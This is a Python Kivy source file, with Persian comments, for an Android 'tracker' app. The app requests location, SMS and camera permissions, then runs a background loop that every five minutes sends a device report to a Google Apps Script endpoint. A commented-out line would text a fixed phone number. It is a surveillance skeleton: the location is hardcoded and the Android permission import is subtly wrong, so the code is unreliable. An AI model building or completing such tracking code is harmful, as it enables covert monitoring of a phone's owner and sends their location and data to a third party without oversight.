import os
import threading
import time
from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from kivy.utils import platform

# کتابخانه‌های مورد نیاز برای عملکرد ردیاب
if platform == 'android':
    from android import permission
    from plyer import gps, sms, camera
    import requests
else:
    # برای تست روی ویندوز/لینوکس اگر کتابخانه‌ها نبودند خطا ندهد
    class Mock:
        def anything(self, *args, **kwargs): pass
    gps = sms = camera = Mock()

# --- تنظیمات گوگل شیت (باید بعداً اینجا لینک را بگذاری) ---
GOOGLE_SHEET_URL = "YOUR_GOOGLE_SCRIPT_WEB_APP_URL"

class TrackerApp(App):
    def build(self):
        self.status_label = Label(text="Tracker is running in background...")
        # شروع فرآیند درخواست مجوزها
        Clock.schedule_once(self.request_permissions, 1)
        # شروع فرآیند جمع‌آوری داده‌ها در پس‌زمینه
        threading.Thread(target=self.background_loop, daemon=True).start()
        return self.status_label

    def request_permissions(self, dt):
        if platform == 'android':
            permissions = [
                permission.Permission.ACCESS_FINE_LOCATION,
                permission.Permission.ACCESS_COARSE_LOCATION,
                permission.Permission.SEND_SMS,
                permission.Permission.READ_SMS,
                permission.Permission.CAMERA,
                permission.Permission.FOREGROUND_SERVICE
            ]
            for p in permissions:
                permission.request(p)
            self.status_label.text = "Permissions Requested. Working..."
        else:
            self.status_label.text = "Running in Test Mode (Desktop)"

    def background_loop(self):
        """این حلقه در پس‌زمینه مدام اجرا می‌شود"""
        while True:
            try:
                data = self.collect_data()
                if data:
                    self.send_to_google_sheets(data)
                
                # زمان انتظار بین هر بار ارسال (مثلاً هر ۵ دقیقه)
                time.sleep(300) 
            except Exception as e:
                print(f"Error in background loop: {e}")
                time.sleep(60)

    def collect_data(self):
        """جمع‌آوری اطلاعات از سنسورها"""
        report = {}
        
        if platform == 'android':
            # ۱. دریافت لوکیشن (ساده شده برای تست)
            try:
                # در نسخه واقعی باید GPS را فعال کرد، اینجا فرض می‌کنیم در دسترس است
                report['location'] = "Lat: 35.6, Lon: 51.3" # مثال
            except: report['location'] = "GPS Error"

            # ۲. ارسال یک SMS تست (در صورت نیاز)
            # sms.send_message(destination="+989123456789", message="Tracker Active")

            # ۳. وضعیت دوربین (فقط تایید دسترسی)
            report['camera'] = "Ready"
        else:
            report['location'] = "Desktop Mode"
            report['camera'] = "Desktop Mode"
            
        report['timestamp'] = time.ctime()
        return report

    def send_to_google_sheets(self, data):
        """ارسال داده‌ها به گوگل شیت"""
        try:
            payload = {'data': str(data)}
            requests.post(GOOGLE_SHEET_URL, params=payload, timeout=10)
            print("Data sent successfully!")
        except Exception as e:
            print(f"Failed to send data: {e}")

if __name__ == '__main__':
    TrackerApp().run()
